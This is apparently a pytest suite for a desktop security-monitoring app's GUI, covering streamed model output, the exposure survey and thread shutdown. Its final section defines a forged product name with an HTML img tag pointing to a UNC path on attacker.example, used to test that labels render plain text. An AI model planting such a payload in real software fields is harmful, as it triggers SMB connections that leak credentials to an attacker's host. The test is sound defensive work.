"""The desktop application's two newest pages.

The window is a generation behind the terminal for most of a project's life,
because a lane gets built where it is easiest to build it. These tests exist so
that the two things the terminal gained - a reading of the machine, and the
model's answer arriving while you watch - stay present in the window too.
"""

from __future__ import annotations

import pytest

pytest.importorskip("PyQt6.QtWidgets")


@pytest.fixture
def window(qt_app):
    from lares import config as config_mod
    from lares.gui.main_window import Window

    return Window(config_mod.load(), autostart=False)


class FakeReply:
    def __init__(self, ok=True, error="", seconds=41.2, tps=2.6):
        self.ok, self.error, self.seconds, self.tps = ok, error, seconds, tps


def test_the_sidebar_and_the_pages_cannot_drift_apart(window):
    """The sidebar selects by index, so a mismatch opens the wrong page."""
    from lares.gui.main_window import PAGES

    assert len(window.page_list) == len(PAGES)


def test_every_page_is_rethemed(window, qt_app):
    """There were two page lists and adding one meant remembering both.

    Forgetting the retheme loop shows up only when someone switches to dark,
    which is late enough to ship.
    """
    import inspect

    from lares.gui.main_window import Window

    source = inspect.getsource(Window.apply_theme)
    assert "self.page_list" in source
    window.set_theme("dark")
    window.set_theme("light")


def test_the_model_is_watched_wherever_it_is_asked(window):
    """One attachment, on the engine, because every lane asks through it."""
    if window.agent.engine is not None:
        assert window.agent.engine.watch is not None


def test_the_answer_appears_while_it_is_being_written(window, qt_app):
    hearth = window.page_hearth
    assert hearth.think_card.isHidden(), "no model, no empty box about one"

    window.voice.asked.emit("the rules", "what this machine is")
    qt_app.processEvents()
    assert not hearth.think_card.isHidden()

    for fragment in ('{"summ', 'ary": ', '"fine"}'):
        window.voice.token.emit(fragment)
    qt_app.processEvents()
    assert hearth.think.text() == '{"summary": "fine"}'


def test_a_long_answer_does_not_grow_without_bound(window, qt_app):
    """A watch left running overnight must not swallow the window."""
    window.voice.asked.emit("rules", "state")
    for _ in range(400):
        window.voice.token.emit("token ")
    qt_app.processEvents()
    assert len(window.page_hearth.think.text()) <= 1400


def test_a_model_that_fails_says_so_rather_than_going_quiet(window, qt_app):
    window.voice.asked.emit("rules", "state")
    window.voice.answered.emit(FakeReply(ok=False, error="out of memory"))
    qt_app.processEvents()
    assert "out of memory" in window.page_hearth.think_note.text()


def test_a_model_that_answers_reports_what_it_cost(window, qt_app):
    window.voice.asked.emit("rules", "state")
    window.voice.answered.emit(FakeReply())
    qt_app.processEvents()
    note = window.page_hearth.think_note.text()
    assert "41.2s" in note and "2.6 tokens" in note


def test_the_exposure_page_shows_what_was_read(window, qt_app):
    from lares.sense import surface as surface_mod

    page = window.page_exposure
    page.surface = surface_mod.survey()
    page.refresh()
    qt_app.processEvents()

    assert page.t_exposed.value.text() == "9"
    assert page.t_software.value.text() == "7"
    assert page.t_admins.value.text() == "3"
    assert page.body.body.count() == len(surface_mod.COLLECTORS)


def test_a_reading_that_did_not_happen_is_not_shown_as_zero(window, qt_app):
    from lares.sense import surface as surface_mod

    page = window.page_exposure
    page.surface = surface_mod.survey(only=["ports"])
    page.refresh()
    qt_app.processEvents()

    assert page.t_exposed.value.text() == "9"
    assert page.t_software.value.text() == "?", "0 would be a claim, not a reading"


def test_the_survey_runs_off_the_interface_thread(window):
    """Six PowerShell collectors on the UI thread is a frozen window."""
    import inspect

    from lares.gui.main_window import ExposurePage

    source = inspect.getsource(ExposurePage.start)
    assert "QThread()" in source and "moveToThread" in source


def test_closing_the_window_stops_the_survey_thread(qt_app):
    """Qt aborts the process when a QThread is destroyed while running.

    Closing during a reading - several seconds, and exactly when someone
    impatient gives up - took the application down on the way out.
    """
    import inspect

    from lares.gui.main_window import Window

    source = inspect.getsource(Window.closeEvent)
    assert "page_exposure.shutdown()" in source

    from lares import config as config_mod

    window = Window(config_mod.load(), autostart=False)
    window.page_exposure.start()          # really starts a thread
    window.close()                        # must not leave it running
    assert window.page_exposure._thread is None


def test_the_reading_happens_without_being_asked(qt_app):
    """Nothing else in this application waits for a button."""
    import inspect

    from lares.gui.main_window import ExposurePage

    source = inspect.getsource(ExposurePage.__init__)
    assert "QTimer.singleShot" in source and "self.start" in source
    assert "window.autostart" in source, "a test window must not start threads"


def test_the_window_says_who_writes_the_code_that_runs(window, qt_app):
    """The single most important thing about this application.

    A person could use the desktop app for a year without learning that the
    model here cannot write code, or that there is a program where it can.
    """
    from lares.gui.widgets import Text

    said = " ".join(w.text() for w in window.page_colophon.findChildren(Text))
    assert "catalogue" in said.lower()
    assert "lares-freehand" in said
    assert "cannot introduce one" in said


# --------------------------------------------------------------------------
# The window renders what the machine said, and the machine is not trusted
# --------------------------------------------------------------------------

FORGED = 'Acme Reader <b>SAFE</b> <img src="\\\\attacker.example\\s\\a.png">'


def test_no_label_in_the_application_renders_rich_text(qt_app):
    """QLabel defaults to AutoText, which guesses "HTML" for anything with a
    tag in it - and nearly everything shown here came off the machine.

    A product name under HKCU, which the logged-in user can write with no UAC
    prompt, reached a label on the Exposure page. The tags were swallowed, so
    the operator read "Acme Reader" and never saw the payload; and Qt resolved
    the image resource, which on Windows opens an SMB session to the
    attacker's host from a process running as administrator.
    """
    from PyQt6.QtCore import Qt

    from lares.gui.widgets import Text

    label = Text(FORGED)
    assert label.textFormat() == Qt.TextFormat.PlainText
    assert label.text() == FORGED, "the text is shown in full, just not parsed"


def test_a_forged_product_name_reaches_the_page_intact(window, qt_app):
    """End to end: through the survey, the comparison, and onto the page."""
    import copy

    from lares.gui.widgets import Text
    from lares.sense import baseline as baseline_mod
    from lares.sense import surface as surface_mod

    before = surface_mod.survey()
    after = copy.deepcopy(before)
    after.get("software").rows.append(
        {"name": FORGED, "version": "1.0", "publisher": "x"})

    page = window.page_exposure
    page._done(after, baseline_mod.compare(before, after))
    qt_app.processEvents()

    shown = " ".join(w.text() for w in page.changes_body.findChildren(Text))
    assert "Acme Reader" in shown
    assert "<img" in shown, "the payload must be visible, not swallowed"
    for label in page.changes_body.findChildren(Text):
        assert label.textFormat().name == "PlainText"


def test_the_streamed_model_output_is_plain_text_too(window, qt_app):
    """The same label class carries the model's own reply."""
    window.voice.asked.emit("rules", "state")
    window.voice.token.emit('{"summary": "<img src=\\"\\\\\\\\x\\\\y\\">"}')
    qt_app.processEvents()
    assert window.page_hearth.think.textFormat().name == "PlainText"
